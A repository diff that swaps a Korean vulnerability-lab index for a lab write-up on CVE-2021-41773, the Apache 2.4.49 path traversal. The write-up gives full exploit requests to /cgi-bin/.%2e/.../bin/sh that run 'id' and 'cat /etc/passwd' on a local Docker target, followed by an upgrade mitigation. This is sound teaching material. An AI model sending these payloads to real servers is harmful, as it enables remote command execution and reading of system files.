@@ -1,126 +1,123 @@
-# Korean Vulhub (한글판)
+# CVE-2021-41773
 
-![logo](./README.assets/logo.svg)
+Contributors
+- 박윤하(@Park123r)
 
-취약한 도커 환경을 구축하여, 이해도를 높이고, 실습을 통해 보안 기술을 익히는 것을 목표로 합니다.
+## Apache HTTP Server 경로 탐색 및 RCE
 
-[Vulhub](https://github.com/vulhub/vulhub) (<https://vulhub.org/>) 을 참고하여, 다양한 컨테이너 기반의 취약한 환경을 구축합니다.
+이 취약점은 Apache HTTP Server 버전 2.4.49가 출시되면서 경로 정규화 설정 변경 사항에서 취약점이 발견되었다. 
 
-<br/>
+공격자는 경로 탐색 공격을 사용하여 디렉터리 외부의 파일에 URL을 매핑 할 수 있다.
 
-### Table of Contents
+디렉터리 외부에 있는 파일이 일반적인 기본 구성인 “require all denied” 으로 보호되지 않고 CGI 스크립트가 활성화된 경우 원격 코드 실행이 허용 될 수 있다.
 
-- **ActiveMQ** — Java 기반 오픈소스 메시지 브로커
-    - [CVE-2016-3088](./ActiveMQ/CVE-2016-3088/README.md) — ActiveMQ fileserver 임의 파일 쓰기 → RCE
-        - Contributor: [@Roronoawjd](https://github.com/Roronoawjd) | Risk Score: 9.8 (Reproducibility: 75%)
+- CGI(Common Gateway Interface, 공용 게이트웨이 인터페이스)
 
-- **CouchDB** — Erlang 기반 오픈소스 문서 지향 NoSQL 데이터베이스
-    - [CVE-2017-12635](./CouchDB/CVE-2017-12635/README.md) — CouchDB JSON 파서 불일치를 이용한 원격 권한 상승
-        - Contributor: [@jason1343](https://github.com/jason1343) | Risk Score: 9.8 (Reproducibility: 70%)
+정적인 웹 서버가 파이썬, C언어, 셸 스크립트 같은 외부 프로그램과 대화할 수 있도록 이어주는 통로 
 
-- **Django** — Python 기반 웹 프레임워크
-    - [CVE-2021-35042](./Django/CVE-2021-35042/README.md) — QuerySet.order_by() SQL Injection
-        - Contributor: [@sj1226m](https://github.com/sj1226m) | Risk Score: 7.5 (Reproducibility: 70%)
-    - [CVE-2022-34265](./Django/CVE-2022-34265/README.ko-kr.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@woohyun212](https://github.com/woohyun212) | Risk Score: 9.8 (Reproducibility: 85%)
-    - [CVE-2022-34265 (2)](./Django/CVE-2022-34265_2/README.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@KMINGON](https://github.com/KMINGON) | Risk Score: 9.8 (Reproducibility: 80%)
+### 참고 자료
 
-- **Express** — Node.js 웹 프레임워크
-    - [CVE-2024-29041](./Express/CVE-2024-29041/README.md) — Express 오픈 리다이렉트 취약점
-        - Contributor: [@j93es](https://github.com/j93es) | Risk Score: 6.1 (Reproducibility: 75%)
+https://socprime.com/ko/blog/detect-cve-2021-41773-path-traversal-zero-day-in-apache-http-server/
 
-- **Elfinder** — PHP 기반 웹 파일 관리자
-    - [CVE-2021-32682](./Elfinder/CVE-2021-32682/README.md) — ZIP 인수 삽입을 통한 원격 코드 실행
-        - Contributor: [@Tjdmin1](https://github.com/Tjdmin1) | Risk Score: 9.8 (Reproducibility: 75%)
+https://www.picussecurity.com/resource/blog/simulate-apache-cve-2021-41773-exploits-vulnerability
 
-- **Flask** — Python 경량 웹 프레임워크
-    - [SSTI](./Flask/SSTI/README.md) — Server Side Template Injection
-        - Contributor: [@positiveWand](https://github.com/positiveWand) | Risk Score: 9.0 (Reproducibility: 75%)
+https://httpd.apache.org/security/vulnerabilities_24.html
 
-- **Gradio** — Python 기반 ML 모델 웹 인터페이스 라이브러리
-    - [CVE-2023-51449](./Gradio/CVE-2023-51449/README.md) — /file 엔드포인트 디렉터리 트래버설
-        - Contributor: [@annseojin](https://github.com/annseojin) | Risk Score: 7.5 (Reproducibility: 80%)
+### 환경 설정
 
-- **GeoServer** — Java 기반 오픈소스 공간 데이터 서버
-    - [CVE-2023-25157](./GeoServer/CVE-2023-25157/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@djadydwls0720](https://github.com/djadydwls0720) | Risk Score: 9.8 (Reproducibility: 65%)
-    - [CVE-2023-25157 (2)](./GeoServer/CVE-2023-25157_2/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@moooooji](https://github.com/moooooji) | Risk Score: 9.8 (Reproducibility: 60%)
+```c
+docerk compuse up -d
+```
 
-- **HugeGraph** — Apache 기반 오픈소스 그래프 데이터베이스
-    - [CVE-2024-43441](./HugeGraph/CVE-2024-43441/README.md) — JWT 비밀 키 하드코딩으로 인한 인증 우회
-        - Contributor: [@HanTul](https://github.com/HanTul) | Risk Score: 9.8 (Reproducibility: 85%)
+환경 구축이 끝나면 http://localhost:8080 으로 Apache HTTP Server 버전 2.4.49 버전에 접속할 수 있다. 
 
-- **Librsvg** — GNOME SVG 렌더링 라이브러리
-    - [CVE-2023-38633](./Librsvg/CVE-2023-38633/README.md) — librsvg xi:include 디렉터리 탐색 파일 읽기
-        - Contributor: [@EL55](https://github.com/EL55) | Risk Score: 7.5 (Reproducibility: 80%)
+```c
+docker ps
+```
 
-- **Libssh** — SSHv2 프로토콜 C 라이브러리
-    - [CVE-2018-10933](./Libssh/CVE-2018-10933/README.md) — libssh 서버 state machine 인증 우회
-        - Contributor: [@hhtboy](https://github.com/hhtboy) | Risk Score: 9.8 (Reproducibility: 75%)
+컨테이너 상태를 확인하다.
+![docker ps](2.png)
 
-- **MongoExpress** — MongoDB 웹 기반 관리 인터페이스
-    - [CVE-2019-10758](./MongoExpress/CVE-2019-10758/README.md) — mongo-express 원격 코드 실행
-        - Contributor: [@ilohas0021](https://github.com/ilohas0021) | Risk Score: 9.8 (Reproducibility: 80%)
 
-- **MySQL** — 관계형 데이터베이스
-    - [CVE-2012-2122](./MySQL/CVE-2012-2122/README.md) — MySQL Authentication Bypass
-        - Contributor: [@baethwjd2](https://github.com/baethwjd2) | Risk Score: 7.0 (Reproducibility: 70%)
+### 취약점 실습
 
-- **Next.js** — React 기반 풀스택 웹 프레임워크
-    - [CVE-2025-29927](./Next.js/CVE-2025-29927/README.md) — Next.js 미들웨어 인가 우회
-        - Contributor: [@idealinsane](https://github.com/idealinsane) | Risk Score: 9.1 (Reproducibility: 85%)
+BurpSuite의 브라우저를 사용하여 서버에 접속해 패킷을 수집한다.
+![서버 접속](1.png)
 
-- **Nginx** — 고성능 웹 서버 / 리버스 프록시
-    - [CVE-2017-7529](./Nginx/CVE-2017-7529/README.md) — Nginx Integer Overflow Vulnerability
-        - Contributor: [@c0dep1ayer](https://github.com/c0dep1ayer) | Risk Score: 7.5 (Reproducibility: 75%)
 
-- **Node** — JavaScript 런타임 환경
-    - [CVE-2017-14849](./Node/CVE-2017-14849/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@ssongk](https://github.com/ssongk) | Risk Score: 7.5 (Reproducibility: 75%)
-    - [CVE-2017-14849 (2)](./Node/CVE-2017-14849_2/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@junwonheo](https://github.com/junwonheo) | Risk Score: 7.5 (Reproducibility: 65%)
 
-- **PHP** — 서버 사이드 스크립트 언어
-    - [CVE-2012-1823](./PHP/CVE-2012-1823/README.md) — php-cgi 인자 주입을 통한 원격 코드 실행
-        - Contributor: [@kty121](https://github.com/kty121) | Risk Score: 9.8 (Reproducibility: 80%)
 
-- **Python** — Python 런타임 환경
-    - [CVE-2017-8291](./Python/CVE-2017-8291/README.md) — PIL(Pillow) GhostScript EPS 처리 RCE
-        - Contributor: [@wjdgnsdl213](https://github.com/wjdgnsdl213) | Risk Score: 9.8 (Reproducibility: 75%)
+```json
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: localhost:8080
+Cache-Control: max-age=0
+sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 1.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+If-None-Match: "2d-432a5e4a73a80"
+If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT
+Connection: close
+Content-Length: 8
 
-- **Redis** — 인메모리 키-값 데이터베이스
-    - [CVE-2022-0543](./Redis/CVE-2022-0543/README.md) — Lua 샌드박스 탈출을 통한 원격 코드 실행
-        - Contributor: [@yeo0n](https://github.com/yeo0n) | Risk Score: 10.0 (Reproducibility: 65%)
+echo; id
+```
 
-- **Spring** — Java 엔터프라이즈 웹 프레임워크
-    - [CVE-2022-22963](./Spring/CVE-2022-22963/README.md) — Spring Cloud Function SpEL 코드 주입
-        - Contributor: [@foskingson](https://github.com/foskingson) | Risk Score: 9.8 (Reproducibility: 75%)
-    - [CVE-2022-22965](./Spring/CVE-2022-22965/README.md) — Spring Framework RCE via Data Binding (Spring4Shell)
-        - Contributor: [@ddddabi](https://github.com/ddddabi) | Risk Score: 9.8 (Reproducibility: 70%)
-    - [CVE-2022-22978](./Spring/CVE-2022-22978/README.md) — Spring Security Authorization Bypass in RegexRequestMatcher
-        - Contributor: [@sub0810](https://github.com/sub0810) | Risk Score: 9.8 (Reproducibility: 80%)
+![id 명령](3.png)
 
-- **Struts2** — Java 기반 MVC 웹 프레임워크
-    - [CVE-2018-11776](./Struts2/CVE-2018-11776/README.md) — Struts2 S2-057 URL 매핑 OGNL 표현식 주입 RCE
-        - Contributor: [@ye11oc4t](https://github.com/ye11oc4t) | Risk Score: 8.1 (Reproducibility: 80%)
-    - [CVE-2019-0230](./Struts2/CVE-2019-0230/README.md) — Struts2 S2-059 OGNL 표현식 주입 RCE
-        - Contributor: [@hy30nq](https://github.com/hy30nq) | Risk Score: 9.8 (Reproducibility: 80%)
 
-- **Tiki Wiki** — PHP 기반 오픈소스 CMS / Wiki
-    - [CVE-2020-15906](./TikiWiki/CVE-2020-15906/README.md) — TikiWiki CMS Authentication Bypass → RCE
-        - Contributor: [@haijun9](https://github.com/haijun9) | Risk Score: 8.8 (Reproducibility: 60%)
+요청 패킷을 POST 메소드로 변경하고 특정 경로와 Body 값을 삽입 후 전송한다. 
 
-- **Tomcat** — Java 기반 오픈소스 웹 애플리케이션 서버
-    - [CVE-2020-1938](./Tomcat/CVE-2020-1938/README.md) — Apache Tomcat AJP 파일 읽기 (Ghostcat)
-        - Contributor: [@mythofsummer](https://github.com/mythofsummer) | Risk Score: 9.8 (Reproducibility: 70%)
+id 명령어를 사용했다. 
 
-<br/>
+Request 로 id를 받아 Response 로 uid=1(daemon) gid=1(daemon)… 권한이 출력되었다.
 
-### Report Evaluation
+```json
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: localhost:8080
+Cache-Control: max-age=0
+sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+If-None-Match: "2d-432a5e4a73a80"
+If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT
+Connection: close
+Content-Length: 21
 
-각 보고서는 취약점 자체의 위험도와 Report Reliability를 분리해 평가합니다. Docker 환경과 제출된 PoC를 재검증한 뒤 기록합니다.
+echo; cat /etc/passwd
+```
 
-- Reproducibility: 제출된 환경과 PoC를 그대로 따랐을 때 재현 가능한 정도를 0%에서 100%로 표현합니다. 환경 구성, 취약 조건, 재현 절차, PoC 코드, 실행 결과, 대응 방안의 명확성을 기준으로 평가합니다.
-- Risk Score: 인증 필요 여부, 원격 악용 가능성, 영향 범위, PoC 및 Docker 환경에서 확인되는 실제 동작을 기준으로 CVSS처럼 0.0에서 10.0 사이로 평가합니다.
+
+![cat /etc/passwd](4.png)
+
+실행 권한 damon으로 시스템 내부 파일인 /etc/passwd 를 출력하는데 성공하였다.
+
+### 환경 종료
+
+```json
+docker compose down
+```
+
+### 대응 방안
+
+- Apache 2.4.49 및 Apache 2.4.50 버전에만 영향을 끼치기 때문에 Apache 2.4.51 버전 이상을 사용한다.
+
+다른 깨끗한 PC 환경에서 동작하는지 확인 완료
+![다른 PC](5.png)
